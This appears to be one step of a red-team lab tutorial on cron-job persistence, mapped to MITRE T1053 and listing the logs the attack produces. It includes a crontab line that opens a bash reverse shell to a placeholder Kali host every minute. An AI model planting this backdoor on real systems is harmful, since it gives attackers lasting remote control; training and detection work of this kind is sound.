🔁 Persistence – Cron Job Backdoor
📌 Objective
Maintain access even after reboot.

🧠 Why?
Attackers want long-term access.

⚙️ Step 1: Add cron job
crontab -e
Add:

* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<kali-ip>/4444 0>&1'
💥 Result
Reverse shell every minute

📊 Logs Generated
cron logs

process execution logs

🎯 MITRE Mapping
T1053 → Scheduled Task

✅ Attack Chain Complete
You have successfully simulated:

✔ Initial Access
✔ Privilege Escalation
✔ Credential Dumping
✔ Lateral Movement
✔ Persistence